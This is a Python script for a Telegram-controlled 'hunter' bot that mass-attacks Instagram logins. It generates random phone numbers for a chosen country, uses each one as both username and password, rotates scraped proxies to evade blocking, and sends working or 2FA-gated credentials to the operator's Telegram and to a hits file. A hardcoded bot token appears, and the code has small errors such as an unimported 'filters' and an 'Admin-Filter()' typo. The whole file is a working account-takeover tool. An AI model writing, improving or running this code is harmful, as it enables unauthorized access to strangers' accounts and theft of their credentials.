# ultimate_hunter.py - v5.3 (Complete Country List)

import requests
from bs4 import BeautifulSoup
import threading
import queue
import time
import random
from datetime import datetime
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, ContextTypes, CallbackQueryHandler
)
import http.server
import socketserver
import os

# ==============================================================================
# SECTION 0: CONFIGURATION
# ==============================================================================

TELEGRAM_BOT_TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U" # ⚠️ استبدل بالتوكن الخاص بك
ADMIN_USER_ID = 1148797883 # ⚠️ استبدل بالـ ID الخاص بك

# --- قاعدة بيانات الدول (مع رمز الدولة وطول الرقم الصحيح) ---
SUPPORTED_COUNTRIES = {
    "🇸🇦 KSA": ("966", 9),
    "🇦🇪 UAE": ("971", 9),
    "🇪🇬 Egypt": ("20", 10),
    "🇮🇶 Iraq": ("964", 10),
    "🇯🇴 Jordan": ("962", 9),
    "🇰🇼 Kuwait": ("965", 8),
    "🇶🇦 Qatar": ("974", 8),
    "🇮🇷 Iran": ("98", 10),   # تمت الإضافة
    "🇱🇾 Libya": ("218", 9),  # تمت الإضافة
    "🇩🇪 Germany": ("49", 10),
    "🇫🇷 France": ("33", 9),
    "🇺🇸 USA": ("1", 10),
    "🇬🇧 UK": ("44", 10),
    "🇹🇷 Turkey": ("90", 10),
}

HITS_FILE = "hits.txt"
MAX_HUNTING_THREADS = 50

# --- متغيرات الحالة العامة ---
is_hunting = False
hunt_task = None
hunt_stats = {
    "processed": 0, "total_targets": 0, "hits": 0, "start_time": None,
    "current_phase": "Idle", "country_code": "", "live_proxies": 0
}
proxy_inventory = queue.Queue()

# ==============================================================================
# SECTION 0.5: ANTI-SLEEP MECHANISM
# ==============================================================================

def _start_heartbeat_server():
    PORT = int(os.environ.get("PORT", 10000))
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Heartbeat server started on port {PORT}")
        httpd.serve_forever()

async def _heartbeat_pinger():
    service_url = os.getenv("RENDER_EXTERNAL_URL")
    if not service_url:
        print("Heartbeat Pinger: RENDER_EXTERNAL_URL not found. Pinger disabled.")
        return
    while True:
        await asyncio.sleep(40)
        try:
            print("Heartbeat Pinger: Sending self-ping to stay awake...")
            requests.get(service_url, timeout=10)
        except Exception as e:
            print(f"Heartbeat Pinger: Self-ping failed: {e}")

# ==============================================================================
# SECTION 1 & 2: PROXY & HUNTING LOGIC (No Changes)
# ==============================================================================
def _proxy_checker(q_in, q_out):
    while True:
        proxy = q_in.get()
        try:
            requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=7)
            q_out.put(proxy)
        except Exception: pass
        q_in.task_done()

async def _proxy_harvester(bot):
    global proxy_inventory
    while True:
        if proxy_inventory.qsize() < 50:
            try:
                print(f"Proxy inventory low ({proxy_inventory.qsize()}). Starting harvester...")
                unchecked_proxies = queue.Queue()
                response = await asyncio.to_thread(requests.get, "https://free-proxy-list.net/", timeout=15)
                soup = BeautifulSoup(response.content, 'html.parser')
                for row in soup.find("table", class_="table-striped").tbody.find_all("tr"):
                    ip, port, _, _, _, _, is_https, _ = [td.string for td in row.find_all("td")]
                    if is_https == 'yes': unchecked_proxies.put(f"http://{ip}:{port}")
                
                for _ in range(100):
                    threading.Thread(target=_proxy_checker, args=(unchecked_proxies, proxy_inventory), daemon=True).start()
                print("Harvester deployed. Workers are filling the inventory.")
            except Exception as e: print(f"Harvester Error: {e}")
        
        hunt_stats["live_proxies"] = proxy_inventory.qsize()
        await asyncio.sleep(60)

def _instagram_worker(target_q, bot_token):
    global hunt_stats
    while True:
        username, password = target_q.get()
        try:
            proxy = proxy_inventory.get(timeout=10)
        except queue.Empty:
            target_q.task_done()
            continue
        try:
            login_url = 'https://www.instagram.com/accounts/login/ajax/'
            headers = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest", "Referer": "https://www.instagram.com/accounts/login/"}
            proxies_dict = {"http": proxy, "https": proxy}
            with requests.Session() as s:
                r = s.get("https://www.instagram.com/accounts/login/", proxies=proxies_dict, timeout=10)
                csrf = r.cookies.get('csrftoken')
                if not csrf: raise Exception("Failed to get CSRF token")
                headers['x-csrftoken'] = csrf
                payload = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{password}'}
                login_r = s.post(login_url, data=payload, headers=headers, proxies=proxies_dict, timeout=10)
                if login_r.status_code == 200:
                    data = login_r.json()
                    status = "FAIL"
                    if data.get("authenticated"): status = "SUCCESS"
                    elif "checkpoint_url" in login_r.text: status = "CHECKPOINT"
                    elif data.get("two_factor_required"): status = "2FA"
                    if status != "FAIL":
                        hunt_stats["hits"] += 1
                        asyncio.run(send_hit_notification(status, username, password, bot_token))
                    proxy_inventory.put(proxy)
        except Exception: pass
        finally:
            hunt_stats["processed"] += 1
            target_q.task_done()

async def the_hunt(context: ContextTypes.DEFAULT_TYPE, country_code: str, number_length: int):
    global is_hunting, hunt_stats
    is_hunting = True
    hunt_stats.update({
        "processed": 0, "total_targets": 0, "hits": 0, "start_time": time.time(),
        "current_phase": "Hunting", "country_code": country_code
    })
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🎯 **Hunt started for country code: +{country_code}** (Length: {number_length} digits)")
    target_queue = queue.Queue()
    num_targets = 10000
    for _ in range(num_targets):
        random_part = ''.join(random.choice('0123456789') for _ in range(number_length))
        full_number = f"{country_code}{random_part}"
        target_queue.put((full_number, full_number))
    hunt_stats["total_targets"] = num_targets
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🔥 Generated {num_targets} targets. Deploying hunter workers...")
    for _ in range(MAX_HUNTING_THREADS):
        threading.Thread(target=_instagram_worker, args=(target_queue, context.bot.token), daemon=True).start()
    target_queue.join()
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text="✅ **Hunt Finished!**")
    is_hunting = False
    hunt_stats["current_phase"] = "Finished"

# ==============================================================================
# SECTION 3: TELEGRAM HANDLERS (No Changes)
# ==============================================================================
class AdminFilter(filters.BaseFilter):
    def filter(self, message: Update): return message.from_user.id == ADMIN_USER_ID
admin_filter = AdminFilter()

async def send_hit_notification(status, username, password, bot_token):
    bot = Application.builder().token(bot_token).build().bot
    result_message = f"🎯 *HIT FOUND!* ({hunt_stats['hits']}) 🎯\n\n*Status:* `{status}`\n*Username:* `{username}`\n*Password:* `{password}`"
    await bot.send_message(chat_id=ADMIN_USER_ID, text=result_message, parse_mode='Markdown')
    with open(HITS_FILE, "a") as f: f.write(f"{username}:{password} | Status: {status}\n")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 **Welcome to the Ultimate Hunter Bot v5.3!**\n\n"
        "▶️ `/hunt` - To start a new hunt.\n"
        "🛑 `/stophunt` - To stop the current hunt.\n"
        "📊 `/status` - Get a live progress report."
    , parse_mode='Markdown')

async def hunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_hunting:
        await update.message.reply_text("⚠️ A hunt is already in progress.")
        return
    keyboard = []
    row = []
    # Sort countries by name for better presentation
    sorted_countries = sorted(SUPPORTED_COUNTRIES.items())
    for name, (code, length) in sorted_countries:
        row.append(InlineKeyboardButton(name, callback_data=f"hunt_{code}_{length}"))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row: keyboard.append(row)
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('🌍 **Select a Country to Start Hunting:**', reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global hunt_task
    query = update.callback_query
    await query.answer()
    action, country_code, number_length_str = query.data.split('_')
    number_length = int(number_length_str)
    if action == "hunt":
        if is_hunting:
            await query.edit_message_text(text="⚠️ A hunt is already in progress.")
            return
        await query.edit_message_text(text=f"🚀 **Command received!** Starting hunt for `+{country_code}`.", parse_mode='Markdown')
        hunt_task = asyncio.create_task(the_hunt(context, country_code, number_length))

async def stophunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_hunting, hunt_task
    if not is_hunting:
        await update.message.reply_text("ℹ️ No hunt is currently running.")
        return
    is_hunting = False
    if hunt_task: hunt_task.cancel()
    await update.message.reply_text("⏳ **Stopping...** The hunt will be terminated shortly.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_hunting and hunt_stats["current_phase"] == "Idle":
        await update.message.reply_text(f"🅾️ **Status:** The bot is idle.\nLive Proxies in Stock: `{proxy_inventory.qsize()}`")
        return
    percentage = (hunt_stats["processed"] / hunt_stats["total_targets"] * 100) if hunt_stats["total_targets"] > 0 else 0
    elapsed_time = time.strftime("%H:%M:%S", time.gmtime(time.time() - hunt_stats["start_time"])) if hunt_stats["start_time"] else "N/A"
    status_message = (f"📊 **Live Hunt Status** 📊\n\n▪️ **Country:** `+{hunt_stats['country_code']}`\n▪️ **Phase:** `{hunt_stats['current_phase']}`\n▪️ **Progress:** {hunt_stats['processed']} / {hunt_stats['total_targets']}\n▪️ **Completion:** `{percentage:.2f}%`\n▪️ **Hits:** `{hunt_stats['hits']}`\n▪️ **Proxies:** `{proxy_inventory.qsize()}`\n▪️ **Time:** `{elapsed_time}`")
    await update.message.reply_text(status_message, parse_mode='Markdown')

# ==============================================================================
# SECTION 4: MAIN APPLICATION
# ==============================================================================
async def post_init(application: Application):
    await application.bot.send_message(
        chat_id=ADMIN_USER_ID,
        text="✅ **Bot Online & Ready! (v5.3 Anti-Sleep)**\n\n"
             "🏭 Proxy harvester is active.\n"
             "❤️ Fast heartbeat is active (40s interval).\n\n"
             "Use `/hunt` to start."
    )
    asyncio.create_task(_proxy_harvester(application.bot))
    asyncio.create_task(_heartbeat_pinger())

def main():
    print("--- ULTIMATE HUNTER BOT v5.3 is starting... ---")
    threading.Thread(target=_start_heartbeat_server, daemon=True).start()
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).post_init(post_init).build()
    
    application.add_handler(CommandHandler("start", start_command, filters=AdminFilter()))
    application.add_handler(CommandHandler("hunt", hunt_command, filters=Admin-Filter()))
    application.add_handler(CommandHandler("stophunt", stophunt_command, filters=AdminFilter()))
    application.add_handler(CommandHandler("status", status_command, filters=AdminFilter()))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    print("Bot is now listening for commands on Telegram.")
    application.run_polling()

if __name__ == "__main__":
    main()
